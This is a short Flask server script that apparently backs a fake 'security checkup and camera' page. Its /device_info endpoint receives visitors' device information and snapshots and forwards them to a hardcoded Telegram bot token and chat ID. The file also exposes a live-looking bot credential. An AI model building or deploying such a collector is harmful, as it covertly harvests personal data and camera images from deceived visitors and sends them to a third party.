from flask import Flask, render_template, jsonify, request
import requests
import platform
import json

app = Flask(__name__)

# Replace with your Telegram bot's token and chat ID
TELEGRAM_API_TOKEN = '7613835920:AAHrUPH7VHA-NZLfFwTAgX13xU8NvQIVZ78'
CHAT_ID = '912211827'

# Send data (snapshots and device info) to Telegram
def send_to_telegram(data):
    url = f'https://api.telegram.org/bot{TELEGRAM_API_TOKEN}/sendMessage'
    message = {
        'chat_id': CHAT_ID,
        'text': data
    }
    try:
        requests.post(url, data=message)
    except Exception as e:
        print(f"Error sending message: {e}")

# Endpoint to handle device info and snapshot data
@app.route('/device_info', methods=['POST'])
def device_info():
    data = request.get_json()

    # Send device info to Telegram
    send_to_telegram(f"Device Info: {json.dumps(data)}")
    
    return jsonify({'status': 'success'}), 200

# Main page to display the security checkup and camera
@app.route('/')
def index():
    return render_template('index.html')

if __name__ == "__main__":
    app.run(debug=True)
